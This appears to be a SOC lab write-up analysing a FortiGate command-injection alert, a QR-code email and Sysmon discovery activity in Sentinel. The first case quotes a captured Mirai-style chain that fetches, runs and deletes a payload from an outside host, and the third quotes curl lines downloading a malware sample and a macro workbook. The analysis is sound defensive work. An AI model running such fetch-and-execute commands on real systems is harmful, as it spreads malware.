# SOC Alerts Investigation Lab

![Category](https://img.shields.io/badge/Category-SOC%20Investigation-blue)
![Platform](https://img.shields.io/badge/Platform-FortiGate%20%7C%20Microsoft%20Sentinel-lightgrey)
![Focus](https://img.shields.io/badge/Focus-Alert%20Triage%20%7C%20Quishing%20%7C%20Sysmon-blueviolet)
![Status](https://img.shields.io/badge/Status-Completed-brightgreen)

> Project by Samuel Kim. All rights reserved. See [LICENSE](LICENSE).

## Overview

This project documents three SOC investigations: a FortiGate command-injection alert, a QR-code phishing email, and suspicious endpoint discovery in Microsoft Sentinel/Sysmon. Each case focuses on confirmed evidence, evidence limits, MITRE ATT&CK mapping, and practical follow-up actions.

## Investigation Goals

- Review each alert and identify the strongest technical evidence.
- Separate confirmed findings from assumptions or incomplete proof.
- Map behavior to MITRE ATT&CK and Cyber Kill Chain stages.
- Recommend practical validation and response actions for each case.

## Investigation Summary

| Case | Initial signal | Final assessment |
|------|----------------|------------------|
| FortiGate command injection | HTTP request with injected shell commands | True positive malicious exploitation attempt against `web.seesec.co.il`; compromise is not proven without server-side logs. |
| Quishing email | QR code inside an email message | Likely false positive for confirmed phishing: the QR flow uses Me-QR and reaches legitimate Facebook/Meta infrastructure, with sender-header validation still required. |
| Sentinel/Sysmon discovery | `whoami` activity in Sysmon logs | True-positive suspicious endpoint activity involving Sysmon Event ID 1, Excel-launched `whoami`, `Gift.xlsm`, file-transfer commands, domain-controller reachability checks, and cleanup-related artifacts. |

## Lab Environment

| Component | Role |
|-----------|------|
| FortiGate IPS | Network alert source for the command-injection event. |
| Microsoft Sentinel | SIEM used to search and correlate endpoint telemetry. |
| Sysmon | Windows telemetry source for process creation and command-line data. |
| VirusTotal / AbuseIPDB | Public reputation sources used to enrich indicators. |
| QR and email inspection tools | Used to inspect the suspicious email, sender address, and QR destination. |
| Any.Run / sandbox / PCAP review | Used to validate the QR redirect path and the network domains reached after opening the QR URL. |

---------

## Case 1 - FortiGate Command Injection

The first case starts with a FortiGate IPS event: external source `195.1.144.109` sends an HTTP request to `web.seesec.co.il`. The URL contains a LuCI-style path and shell commands that download, execute, and delete a payload named `shk`. The investigation separates the source, destination, and payload host so the scanner, protected web service, and download infrastructure are not mixed together.

> Command injection means attacker-controlled input reaches an operating-system shell. In this event, the network log proves that the request was sent to the web service. It does not prove by itself that the target server executed the command.

**Evidence focus:**

- FortiGate recorded the external source, destination service, URL, action, and HTTP user agent.
- The request URL contains a clear shell command sequence.
- Public reputation sources flag the payload host and source context as suspicious.
- Mirai botnet intelligence gives context for the payload infrastructure and IoT/router-style targeting.

### Identify the Source, Destination, and Traffic Direction

The log first establishes direction: `195.1.144.109` is the external source and `web.seesec.co.il` is the protected destination. This is inbound web traffic against a public-facing service, not normal user browsing.

![FortiGate source and destination fields](images/01-command-injection/fortigate-source-destination-summary.png)

<p><sub><strong>Screenshot 001 - FortiGate source and destination fields:</strong> The log row identifies `195.1.144.109` / `no4.nordicvm.no` as the source and `web.seesec.co.il` as the destination service.</sub></p>

The screenshot defines the investigation boundary: an outside host contacted a specific web service. Exploit success still requires server-side evidence.

### Break Down the Injected Command Chain

The strongest evidence is the request URL because it contains a shell-style command sequence.

```text
cd /tmp
rm -rf shk
wget http://103.14.226.142/shk
chmod 777 shk
./shk tplink
rm -rf shk
```

The sequence attempts to remove an old payload, download a new payload from `103.14.226.142`, make it executable, run it, and delete the local file afterward. The `tplink` argument is important because it suggests the payload may be designed for router or IoT-style targets.

The command chain is suspicious because every part has a clear attacker purpose:

| Command part | Analyst meaning |
|--------------|-----------------|
| `cd /tmp` | Uses a writable temporary directory commonly abused during exploitation. |
| `rm -rf shk` | Removes any previous copy of the payload name before downloading a fresh one. |
| `wget http://103.14.226.142/shk` | Pulls an external payload from attacker-controlled or compromised infrastructure. |
| `chmod 777 shk` | Makes the downloaded file executable by any user, which is unnecessary for a normal web request. |
| `./shk tplink` | Attempts to execute the downloaded file with a TP-Link/router-related argument. |
| `rm -rf shk` | Deletes the local payload afterward, reducing simple file-system evidence. |

![Injected LuCI request and payload command](images/01-command-injection/injected-luci-request-url.png)

<p><sub><strong>Screenshot 002 - Injected LuCI request and payload command:</strong> The request URL contains shell metacharacters, a `wget` payload download, executable permission changes, execution, and cleanup.</sub></p>

> LuCI is commonly associated with OpenWrt router administration. Seeing a LuCI-style path together with a `tplink` argument supports the possibility that the attacker is using a botnet-style exploit chain aimed at network devices or web-exposed management interfaces.

### Interpret the FortiGate Action

The FortiGate event shows `deviceAction=Accept`. The log confirms detection and logging of the malicious request, but it does not prove firewall prevention.

![FortiGate IPS action and HTTP service fields](images/01-command-injection/fortigate-ips-action-and-service.png)

<p><sub><strong>Screenshot 003 - FortiGate IPS action and HTTP service fields:</strong> The screenshot shows `Accept`, FortiGate IPS, destination port 80/HTTP, transfer size, and `Go-http-client/1.1`.</sub></p>

`Go-http-client/1.1` often appears in automated tooling written in Go. Combined with the injected command chain, it supports scripted exploitation. The next validation step is correlation with web access logs, application logs, endpoint telemetry, and outbound traffic from the server.

### Enrich the Source and Payload Indicators

The enrichment separates the source IP that sent the request from the payload host embedded in the command.

#### Analyze source IP `195.1.144.109`

`195.1.144.109` initiated the HTTP request. The [VirusTotal report](https://www.virustotal.com/gui/ip-address/195.1.144.109) shows `2/91` vendor detections and AS2116 / Globalconnect AS context, while AbuseIPDB/community reports connect the IP to web exploit activity. The local behavior is stronger than the score: this source sent a command-injection request.

![AbuseIPDB profile for source IP](images/01-command-injection/abuseipdb-source-ip-profile.png)

<p><sub><strong>Screenshot 004 - AbuseIPDB source IP profile:</strong> AbuseIPDB context supports the source IP `195.1.144.109` being suspicious.</sub></p>

Community reports also show TP-Link probing, scanning, SQL injection, and web application attack activity similar to the LuCI/`wget`/`chmod` pattern in this case.

![Community reports for source IP](images/01-command-injection/source-ip-community-reports.png)

<p><sub><strong>Screenshot 005 - Community reports for source IP:</strong> Public reports show previous malicious activity associated with `195.1.144.109`, including web exploit activity and TP-Link-focused probing.</sub></p>

> Reputation evidence does not prove that `web.seesec.co.il` was compromised. It does show that the source IP has a pattern of behavior consistent with automated exploitation and web-application attack traffic.

#### Analyze payload host `103.14.226.142`

`103.14.226.142` appears inside the `wget` command as the payload host. The [VirusTotal report](https://www.virustotal.com/gui/ip-address/103.14.226.142) shows `10/91` detections with malware, malicious, and phishing labels under AS149136 in Vietnam. Because the IP is embedded directly in the exploit command, it is a payload-delivery indicator, not background context.

![VirusTotal result for payload host](images/01-command-injection/virustotal-payload-ip-detection.png)

<p><sub><strong>Screenshot 006 - VirusTotal result for payload host:</strong> VirusTotal flags `103.14.226.142`, the host used by the injected `wget` command.</sub></p>

The address also appears in Mirai Botnet IOC context, matching the router/IoT pattern suggested by the LuCI path and `tplink` argument.

### Connect the Payload Host to Mirai Botnet Context

Mirai-style malware commonly targets exposed routers and IoT devices. Here, the payload host, LuCI-style endpoint, and `tplink` argument point toward automated botnet-style exploitation.

![Mirai botnet IOC context](images/01-command-injection/mirai-botnet-ioc-context.png)

<p><sub><strong>Screenshot 007 - Mirai Botnet IOC context:</strong> The IOC report lists `103.14.226.142`, the same IP used in the injected `wget` command, under a Mirai Botnet indicator set.</sub></p>

The report describes Mirai indicators such as IPs, ports, domains, and hashes, with capabilities including DDoS, device compromise, and data theft.

![Mirai threat description](images/01-command-injection/mirai-threat-description.png)

<p><sub><strong>Screenshot 008 - Mirai threat description:</strong> The report describes Mirai as a botnet family targeting IoT devices and routers using multiple indicators of compromise.</sub></p>

> In this alert, the likely scenario is an automated Mirai-style exploitation attempt. The attacker tries to make `web.seesec.co.il` retrieve and execute a payload from infrastructure associated with Mirai indicators. The available evidence supports an attempted exploitation chain, not confirmed successful execution.

### Map the Behavior to MITRE ATT&CK

The visible behavior maps to public-facing exploitation, shell command execution, and tool transfer. The request contains Unix-style commands, and the payload is retrieved with `wget`.

![MITRE command interpreter reference](images/01-command-injection/mitre-t1059-command-interpreter.png)

<p><sub><strong>Screenshot 009 - MITRE command interpreter reference:</strong> The MITRE reference supports mapping the command-execution behavior to Command and Scripting Interpreter techniques.</sub></p>

The mapping describes behavior: public-facing exploitation, shell command execution, and payload transfer.

### Define Server-Side Validation

The network alert is enough to classify the request as malicious, but server compromise requires server-side proof. Validation should include web access/error logs, application logs, endpoint telemetry, file changes, and outbound connections near the alert time. Traces of `wget`, `chmod`, `shk`, `/tmp`, or traffic to `103.14.226.142` would raise the case from attempted exploitation toward likely compromise.

> A firewall log shows that the request reached the security stack. Web server logs and endpoint telemetry show whether the server actually processed the request and executed the command.

### Case 1 Report

| Field | Assessment |
|-------|------------|
| Verdict | True positive malicious exploitation attempt. |
| Attack status | Confirmed attempt against `web.seesec.co.il`; successful compromise is not proven without server-side evidence. |
| Key evidence | LuCI-style request, shell command chain, `wget` payload download, `chmod`, execution syntax, cleanup command, suspicious source reputation, payload-host reputation, and Mirai-related IOC context. |
| Kill Chain and MITRE | Exploitation and payload transfer. Main mappings: [T1190 - Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/), [T1059 - Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/), [T1059.004 - Unix Shell](https://attack.mitre.org/techniques/T1059/004/), and [T1105 - Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/). |
| Evidence limits | FortiGate records `Accept`; no server-side execution log, outbound connection log, or downloaded `shk` artifact is available. |
| Next checks | Review web access/error/application logs, search for `shk`, `/tmp`, `wget`, `chmod`, outbound traffic to `103.14.226.142`, and similar LuCI/Mirai requests. |
| Recommendation | Validate the server, tune IPS prevention if required, block confirmed malicious indicators, and patch or restrict exposed management/application paths. |

---------

## Case 2 - Quishing Email

The second case starts as a QR-code phishing investigation. The email asks the recipient to scan a QR code and join a Facebook group, hiding the real destination until the code is decoded or opened safely.

Any.Run/sandbox and PCAP evidence support a likely false positive for confirmed phishing. The QR code uses an ad-supported Me-QR redirect page, but the observed path reaches legitimate Facebook/Meta infrastructure instead of a fake login page. Weak signals still justify triage: incorrect sender display formatting, hidden destination, and missing full email headers.

Quishing means QR-code phishing. Attackers use QR images to move users away from protected email tooling and into browsers or mobile devices where inspection can be weaker.

> The alert remains valuable as a triage signal. The suspicious delivery method justified investigation, while the validated evidence does not support a malicious phishing verdict.

**Evidence focus:**

- The email contains a QR code and a social-engineering request.
- The sender display name is written like a username instead of a normal full name, which is a weak identity-quality signal.
- The sender domain `see-security.com` is known and appears related to the education/training context.
- The decoded QR URL uses `qr.me-qr.com`, an intermediate QR redirect service.
- Any.Run/sandbox and PCAP evidence show Me-QR ad/redirect behavior followed by traffic to legitimate Facebook and Meta domains.
- No fake Facebook domain, credential-harvesting page, malware download, or suspicious payload execution is confirmed.

### Review the Email Lure

The email asks the user to scan a QR code and join a Facebook group. This can be legitimate or malicious, so the destination must be decoded before judgment.

![Suspicious email with QR code](images/02-quishing/email-message-with-qr-code.png)

<p><sub><strong>Screenshot 010 - Suspicious email with QR code:</strong> The email contains sender and recipient details plus a QR code that asks the user to follow an external path.</sub></p>

The screenshot shows the delivery object only. It does not show a fake login page, attachment, malware download, or credential prompt.

### Validate the Sender Identity

The sender address is `avi.waisman@see-security.com`, but the display name appears as `avi.waisman` instead of a clean personal name. The sender and recipient domains, `see-security.com` and `see-secure.com`, are similar enough to review, although `see-security.com` is known in this lab context.

![Sender mailbox validation result](images/02-quishing/email-address-undeliverable-check.png)

<p><sub><strong>Screenshot 011 - Sender mailbox validation result:</strong> The mailbox check marks `avi.waisman@see-security.com` as undeliverable, which supports additional caution but does not prove spoofing by itself.</sub></p>

The mailbox result is a weak signal, not proof of spoofing. It supports follow-up header validation because mailbox checks can fail because of catch-all domains, anti-enumeration, or temporary server behavior.

> Full email headers are not available, so SPF, DKIM, DMARC, and Received-path validation cannot be completed. A man-in-the-middle scenario is not supported by the current evidence; the stronger explanation is a legitimate QR redirect flow with weak sender-formatting signals.

### Decode and Inspect the QR Destination

The QR code resolves to `https://qr.me-qr.com/shP847fW`, an intermediate QR redirect service. Redirectors can hide final destinations, which makes the alert plausible even when the final page may be legitimate.

![Security vendor detections for QR URL](images/02-quishing/qr-url-vendor-detections.png)

<p><sub><strong>Screenshot 012 - Security vendor detections for QR URL:</strong> The decoded QR URL is checked against security vendors and receives malicious or suspicious detections.</sub></p>

The reputation result is useful, but the key question is where this specific QR link led during controlled testing.

### Validate QR Behavior in Sandbox and PCAP Evidence

The Any.Run/sandbox view shows a Me-QR ad gate with `Watch to continue` and a skip option, not an immediate credential prompt.

![Me-QR ad gate after QR scan](images/02-quishing/meqr-ad-gate-after-qr-scan.png)

<p><sub><strong>Screenshot 013 - Me-QR ad gate after QR scan:</strong> The QR link opens an intermediate Me-QR page that requires watching or skipping an ad before continuing.</sub></p>

The page looks suspicious, but it is ad-gated redirection rather than confirmed credential phishing.

The final observed destination is `https://www.facebook.com/?locale=he_IL`, a legitimate Facebook domain.

![Facebook final destination](images/02-quishing/facebook-login-final-destination.png)

<p><sub><strong>Screenshot 014 - Facebook final destination:</strong> The redirect flow reaches the legitimate `www.facebook.com` login page using the Hebrew locale.</sub></p>

The page is still a login page, so the domain matters. Here it reaches `www.facebook.com`, not a lookalike or non-Meta host.

The PCAP supports the same conclusion: Me-QR and Google ad/measurement domains appear first, followed by Facebook/Meta infrastructure such as `www.facebook.com`, `fbcdn.net`, and `accounts.meta.com`. No counterfeit Facebook domain or malware download is visible. A compact domain summary is documented in [quishing-network-evidence.md](docs/quishing-network-evidence.md).

| Observed domain group | Meaning in the investigation |
|-----------------------|------------------------------|
| `qr.me-qr.com` / `cdn.me-qr.com` | Intermediate QR redirect and content-delivery infrastructure. |
| Google ad and measurement domains | Consistent with the ad-gated Me-QR page shown in the sandbox. |
| `www.facebook.com`, `fbcdn.net`, `accounts.meta.com` | Legitimate Facebook/Meta infrastructure reached after the redirect flow. |

This sequence supports false positive for confirmed phishing: the delivery method was suspicious, but the observed path did not show credential harvesting or payload delivery.

> The finding is suspicious QR delivery, not confirmed credential theft. The available evidence shows an ad-gated QR redirect flow that resolves to a legitimate Facebook destination.

### Define Response and Closure Actions

The response should preserve the email, collect full headers, confirm the campaign with the sender or organization, and monitor the QR URL for destination changes. If authentication fails or the destination changes to credential harvesting, reopen the case as phishing.

### Case 2 Report

| Field | Assessment |
|-------|------------|
| Verdict | False positive for confirmed phishing; suspicious QR delivery still justified triage. |
| Attack status | No confirmed attack. The controlled flow shows an ad-supported Me-QR redirect that reaches legitimate Facebook/Meta infrastructure. |
| Key evidence | QR delivery, weak sender display-name formatting, `qr.me-qr.com` redirect, Me-QR ad gate, final `www.facebook.com` destination, and PCAP domains matching QR, ad, Facebook, and Meta infrastructure. |
| Kill Chain and MITRE | Initially triaged as Delivery. [T1566.002 - Spearphishing Link](https://attack.mitre.org/techniques/T1566/002/) and [T1204 - User Execution](https://attack.mitre.org/techniques/T1204/) are considered but not confirmed as malicious techniques. |
| Evidence limits | Full email headers are unavailable; SPF, DKIM, DMARC, Received path, QR owner, and sender intent still require validation. |
| Next checks | Collect headers, confirm the campaign with the sender or organization, review mail-gateway click telemetry, check other recipients, and monitor the QR URL for destination changes. |
| Recommendation | Close as false positive if sender confirmation and authentication are clean; keep QR redirect monitoring separate from confirmed credential-harvesting alerts. |

---------

## Case 3 - Sentinel and Sysmon Discovery

The third case investigates discovery activity on Windows endpoint `WIN10B` in Microsoft Sentinel. The first signal is `whoami` in Sysmon telemetry, but the case becomes stronger when parent processes, process IDs, command lines, user context, downloads, and cleanup activity are correlated.

`whoami` is legitimate, but it becomes suspicious when launched from Office documents or near downloads and reconnaissance because attackers often check user context before continuing.

> Sysmon records detailed Windows endpoint events such as process creation and command lines. Sentinel makes that telemetry searchable with KQL, allowing the analyst to move from one suspicious command to the surrounding process timeline.

**Evidence focus:**

- Sentinel searches Sysmon Event ID 1 process-creation telemetry.
- Four `whoami.exe` executions are identified on `5/7/2024` as displayed in Sentinel.
- The first event is launched from `cmd.exe`, while the later events are launched through Microsoft Excel.
- Excel opens the macro-enabled workbook `C:\Users\Jim.WIN10B\Desktop\Gift.xlsm`.
- Process IDs, parent process IDs, parent images, and timestamps show repeated execution rather than one isolated command.
- The wider timeline includes elevated installer context, OneDrive setup deletion, cleanup utilities, domain-controller ping checks, MalwareBazaar-style download activity, and repeated `Gift.xlsm` downloads.

### Search Sysmon Process Telemetry for `whoami`

The investigation starts with a KQL query that searches Sysmon events where the command line contains `whoami`.

```kql
Sysmon
| where CommandLine contains "whoami"
```

![Sentinel query for whoami activity](images/03-sentinel-sysmon/sentinel-kql-whoami-results.png)

<p><sub><strong>Screenshot 015 - Sentinel query for whoami activity:</strong> The Sentinel result shows multiple Sysmon process creation events where the command line contains `whoami`.</sub></p>

Each result has `EventID=1`, Sysmon's process-creation event, so these are actual process executions with command-line and parent-process context.

> A command name alone is not enough for a verdict. In Sysmon, the value comes from comparing `Image`, `CommandLine`, `ProcessId`, `ParentImage`, `ParentCommandLine`, `ParentProcessId`, user, and time.

### Reconstruct the Sysmon Event Timeline

The four `whoami.exe` records below show the timeline changing from a normal `cmd.exe` parent to repeated Excel-driven execution.

#### Event 01 - Baseline Command Prompt Execution

```text
TimeGenerated UTC : 5/7/2024 7:50:04.820 AM
Source            : Microsoft-Windows-Sysmon
EventID           : 1 - Process Create
User              : WIN10B\Jim
Image             : C:\Windows\System32\whoami.exe
CommandLine       : whoami
ProcessId         : 6972
ParentImage       : C:\Windows\System32\cmd.exe
ParentCommandLine : "C:\Windows\system32\cmd.exe"
ParentProcessId   : 4836
```

This is the baseline: `whoami.exe` is launched from `cmd.exe`, which is normal for manual command-line use.

> The parent process is the key detail here. `cmd.exe` is expected for a user manually typing `whoami`, while Office applications launching the same command require much closer review.

#### Event 02 - Excel Launches Identity Discovery

```text
TimeGenerated UTC : 5/7/2024 12:14:39.812 PM
Source            : Microsoft-Windows-Sysmon
EventID           : 1 - Process Create
User              : WIN10B\Jim
Image             : C:\Windows\System32\whoami.exe
CommandLine       : whoami
ProcessId         : 3344
ParentImage       : C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE
ParentCommandLine : "C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE" "C:\Users\Jim.WIN10B\Desktop\Gift.xlsm"
ParentProcessId   : 9164
```

The second event changes the verdict: `EXCEL.EXE` launches `whoami.exe`, and the parent command line points to `Gift.xlsm`. A macro-enabled workbook spawning identity discovery is suspicious and may indicate macro logic or embedded automation.

#### Event 03 - Repeated Discovery from the Same Excel Process

```text
TimeGenerated UTC : 5/7/2024 12:14:55.257 PM
Source            : Microsoft-Windows-Sysmon
EventID           : 1 - Process Create
User              : WIN10B\Jim
Image             : C:\Windows\System32\whoami.exe
CommandLine       : whoami
ProcessId         : 8388
ParentImage       : C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE
ParentCommandLine : "C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE" "C:\Users\Jim.WIN10B\Desktop\Gift.xlsm"
ParentProcessId   : 9164
```

The third event repeats the same behavior sixteen seconds later from the same Excel parent process ID `9164`, suggesting scripted or repeated execution context checks.

#### Event 04 - Later Excel Process Repeats the Pattern

```text
TimeGenerated UTC : 5/7/2024 12:38:03.237 PM
Source            : Microsoft-Windows-Sysmon
EventID           : 1 - Process Create
User              : WIN10B\Jim
Image             : C:\Windows\System32\whoami.exe
CommandLine       : whoami
ProcessId         : 5792
ParentImage       : C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE
ParentCommandLine : "C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE" "C:\Users\Jim.WIN10B\Desktop\Gift.xlsm"
ParentProcessId   : 2852
```

The fourth event uses a later Excel parent process ID, `2852`, but still points to `Gift.xlsm`. The repeated Excel-to-`whoami` pattern should be investigated with the later `curl`, ping, and cleanup commands.

> The case is not built on `whoami.exe` being malicious. The case is built on how, when, and from where `whoami.exe` was launched.

### Compare Process IDs, Timing, and Parent Process Context

The process IDs confirm that Sentinel is showing four separate `whoami.exe` executions: `6972`, `3344`, `8388`, and `5792`.

![Changing whoami process IDs](images/03-sentinel-sysmon/changing-whoami-process-ids.png)

<p><sub><strong>Screenshot 016 - Changing process IDs:</strong> The repeated `whoami` executions use different process IDs, showing multiple executions rather than one static event.</sub></p>

The parent process is the key difference: the first event comes from `cmd.exe`, while later events come from `EXCEL.EXE`. Two share `ParentProcessId=9164`, and one later event uses `2852`.

![Excel parent process and repeated timestamps](images/03-sentinel-sysmon/excel-parent-process-and-event-times.png)

<p><sub><strong>Screenshot 017 - Excel parent process and parent command line:</strong> The screenshot shows `EXCEL.EXE` as the parent process and `C:\Users\Jim.WIN10B\Desktop\Gift.xlsm` in the parent command line.</sub></p>

![Timestamp sequence for repeated whoami executions](images/03-sentinel-sysmon/whoami-event-time-sequence.png)

<p><sub><strong>Screenshot 018 - Repeated whoami time sequence:</strong> Three suspicious `whoami` executions occur around 12:14 PM and 12:38 PM after the earlier baseline event.</sub></p>

The first `whoami` at 7:50 AM can be normal. The later Excel-linked events support repeated discovery tied to `Gift.xlsm`.

### Expand the Timeline Beyond `whoami`

The deeper timeline adds context around the same user, workbook, downloads, and cleanup-related activity.

![Elevated command context](images/03-sentinel-sysmon/elevated-command-context.png)

<p><sub><strong>Screenshot 019 - Elevated command context:</strong> The command line shows `C:\Users\Jim.WIN10B\Downloads\OfficeSetup.exe` with an `ELEVATED` context and a user SID.</sub></p>

The elevated installer is not automatically malicious, but its hash, source, and timing should be reviewed.

![OneDrive update command](images/03-sentinel-sysmon/onedrive-update-command.png)

<p><sub><strong>Screenshot 020 - OneDrive-related command:</strong> The command uses `cmd.exe /q /c del /q` to delete `C:\Users\Jim.WIN10B\AppData\Local\Microsoft\OneDrive\Update\OneDriveSetup.exe`.</sub></p>

Deleting an updater can be maintenance or cleanup; here it matters because it appears near Excel-launched discovery and downloads.

![Cleanmgr autoclean command](images/03-sentinel-sysmon/cleanmgr-autoclean-command.png)

<p><sub><strong>Screenshot 021 - Cleanmgr autoclean command:</strong> The command shows `C:\Windows\System32\cleanmgr.exe /autoclean /d C:`, which is a cleanup action against the C drive.</sub></p>

![CCleaner and Office process activity](images/03-sentinel-sysmon/ccleaner-and-office-processes.png)

<p><sub><strong>Screenshot 022 - CCleaner and Office process activity:</strong> The process list includes `CCleaner64.exe /MONITOR`, `CCleaner.exe /MONITOR /uac`, Microsoft Edge subprocesses, and Office activity.</sub></p>

Cleanup tools are not automatically malicious, but the timing supports review.

### Review Internal Checks and External Downloads

This part adds internal reachability checks and file-transfer activity. `ping` checks host response, while `curl -o` downloads remote content to a chosen filename. Both are legitimate tools, but the surrounding Excel activity makes the sequence suspicious.

> The concern is the sequence, not one command: Excel opens `Gift.xlsm`, `whoami` runs from Excel, internal systems are checked, and external files are downloaded with command-line tools.

![Recon and process timeline](images/03-sentinel-sysmon/recon-and-process-timeline.png)

<p><sub><strong>Screenshot 023 - Recon and process timeline:</strong> The timeline shows `ping dc`, `ping 10.10.10.10`, `ping dc.local.course`, and `whoami` launched from `cmd.exe`.</sub></p>

The first visible group is internal reachability testing:

```text
ping dc
ping 10.10.10.10
ping dc.local.course
whoami
```

`dc`, `dc.local.course`, and `10.10.10.10` indicate internal reachability checks. This does not prove lateral movement, but it fits reconnaissance near suspicious Excel and `whoami` activity.

![Curl download and ping activity](images/03-sentinel-sysmon/curl-download-and-ping-activity.png)

<p><sub><strong>Screenshot 024 - Curl download and ping activity:</strong> The command evidence includes `curl -o cmd.xex` downloading from `bazaar.abuse.ch`, plus surrounding command-line activity.</sub></p>

The second visible group is external file transfer:

```text
curl -o cmd.xex https://bazaar.abuse.ch/download/69583b9a85076bf1690ef00fceeb77ac998a991375d8ee809ec2fa037f09f3e4/
```

The command downloads from `bazaar.abuse.ch` and saves the file as `cmd.xex`, a name close to trusted `cmd.exe`. This maps to [T1105 - Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/) and resembles [T1036 - Masquerading](https://attack.mitre.org/techniques/T1036/). MalwareBazaar is legitimate for research, but a user endpoint downloading from its `/download/` path is high-signal. File collection and execution telemetry are still needed to prove whether `cmd.xex` downloaded or ran.

![VirusTotal detection for bazaar.abuse.ch](images/03-sentinel-sysmon/virustotal-bazaar-abuse-domain-detection.png)

<p><sub><strong>Screenshot 025 - VirusTotal domain detection for bazaar.abuse.ch:</strong> VirusTotal shows the `bazaar.abuse.ch` domain with a low vendor-detection count, while the community context still treats it as malware-related infrastructure.</sub></p>

The stronger signal is behavioral: `curl` pulls a `/download/` URL and saves it as an executable-looking file.

### Investigate `Gift.xlsm`

`Gift.xlsm` is the key artifact because it appears beside `whoami`, internal checks, `curl` downloads, and cleanup. The `.xlsm` extension means the workbook can contain VBA macros. The file, hash, and macro code are unavailable, so the suspicion is behavioral: Excel opens the workbook repeatedly and is tied to discovery and download activity.

![Repeated Gift.xlsm downloads](images/03-sentinel-sysmon/repeated-gift-xlsm-downloads.png)

<p><sub><strong>Screenshot 026 - Repeated Gift.xlsm downloads:</strong> The screenshot shows repeated `curl` downloads associated with `Gift.xlsm`.</sub></p>

The repeated command is:

```text
curl -o Gift.xlsm https://file.io/atAOsYothaq0
```

This command downloads `Gift.xlsm` from `file.io`, a temporary file-sharing service. The domain is not malicious by default; the risk is a macro-enabled workbook retrieved from temporary hosting and then associated with Excel-launched discovery.

![VirusTotal community context for file.io](images/03-sentinel-sysmon/virustotal-file-io-community-context.png)

<p><sub><strong>Screenshot 027 - VirusTotal community context for file.io:</strong> The community notes describe `file.io` as not necessarily malicious by itself, but also mention its use as a payload-hosting or downloader location in real threat-reporting context.</sub></p>

VirusTotal community notes connect `file.io` with payload distribution in some malware and intrusion reporting. In this case it is best treated as possible delivery or staging infrastructure because the downloaded object is a macro-enabled workbook.

![Gift.xlsm Excel execution timeline](images/03-sentinel-sysmon/gift-xlsm-excel-execution-timeline.png)

<p><sub><strong>Screenshot 028 - Gift.xlsm Excel execution timeline:</strong> Excel opens `C:\Users\Jim.WIN10B\Desktop\Gift.xlsm` multiple times around 8:32 AM, 8:51 AM, and 8:52 AM.</sub></p>

Jim's endpoint opens the workbook several times from the user desktop. Repeated openings can be normal, but here they appear with Excel-launched `whoami`, internal checks, and downloads.

![Extended Gift.xlsm timeline](images/03-sentinel-sysmon/extended-gift-xlsm-timeline.png)

<p><sub><strong>Screenshot 029 - Extended Gift.xlsm timeline:</strong> The extended view shows more Excel executions of `Gift.xlsm` around 9:02 AM and 9:03 AM, followed by repeated `curl -o Gift.xlsm` downloads around 12:07 PM.</sub></p>

The extended timeline shows the workbook as both an executed Office document and a later `curl` download. `file.io` is not automatically malicious, but this endpoint behavior is suspicious because it combines temporary hosting, macro-enabled Office content, repeated execution, Excel-parented discovery, and later downloads.

![Combined whoami and Gift.xlsm timeline](images/03-sentinel-sysmon/combined-whoami-gift-timeline.png)

<p><sub><strong>Screenshot 030 - Combined whoami and Gift.xlsm timeline:</strong> The combined timeline links Excel opening `Gift.xlsm`, `splwow64.exe`, repeated `whoami`, and later Excel execution of the same workbook.</sub></p>

The combined view is the strongest link: several `whoami` executions connect to Excel and `Gift.xlsm`. `splwow64.exe` is a legitimate Windows print-support process, but the priority remains the unusual chain: macro-enabled workbook, Excel parent process, discovery commands, internal checks, and external transfers. `Gift.xlsm` should be treated as the likely central execution or staging artifact until the workbook, macros, hashes, and sandbox behavior are collected.

> The conclusion is behavioral, not file-reputation based. Excel and `Gift.xlsm` appear in a suspicious chain with user discovery, internal reachability checks, external downloads, and cleanup-related activity.

### Case 3 Report

| Field | Assessment |
|-------|------------|
| Verdict | True positive suspicious endpoint activity. |
| Attack status | Credible endpoint incident requiring containment and forensic review; full compromise is not proven from the available evidence. |
| Key evidence | `WIN10B\Jim` opens `Gift.xlsm`; Excel is tied to repeated `whoami`; the timeline includes `file.io` workbook downloads, `cmd.xex` download activity from `bazaar.abuse.ch`, domain-controller checks, and cleanup-related commands. |
| Kill Chain and MITRE | Delivery, execution, and discovery. Main mappings: [T1204.002 - Malicious File](https://attack.mitre.org/techniques/T1204/002/), [T1033 - System Owner/User Discovery](https://attack.mitre.org/techniques/T1033/), [T1105 - Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/), [T1036 - Masquerading](https://attack.mitre.org/techniques/T1036/), and [T1018 - Remote System Discovery](https://attack.mitre.org/techniques/T1018/). |
| Evidence limits | The original `Gift.xlsm`, macro code, workbook hash, sandbox output, `cmd.xex` hash, payload execution, credential theft, persistence, and lateral movement are not confirmed. |
| Next checks | Isolate `WIN10B`, preserve Sysmon logs, collect `Gift.xlsm` and any `cmd.xex` copy, inspect macros, review DNS/proxy/firewall logs for `file.io` and `bazaar.abuse.ch`, search for the same process chain across endpoints, and interview Jim about the file source. |
| Recommendation | Treat as a high-priority endpoint investigation, preserve evidence before cleanup, harden Office macro controls, and alert on Office-spawned commands, temporary-hosting downloads, and repeated discovery commands. |

---------

## Testing and Verification

- FortiGate evidence confirms a malicious command-injection request and identifies the source, destination, payload host, and IPS action.
- Reputation checks support the malicious classification of the command-injection infrastructure, including Mirai-related context.
- QR and PCAP validation show an ad-supported Me-QR redirect that reaches legitimate Facebook/Meta infrastructure, supporting a false-positive disposition for confirmed phishing.
- Sentinel/Sysmon evidence confirms four `whoami.exe` process-creation events, Excel parent-process context, `Gift.xlsm`, changed process IDs, repeated `file.io` workbook downloads, MalwareBazaar context, domain-controller ping checks, elevated installer context, and cleanup-related behavior.

## Final Summary

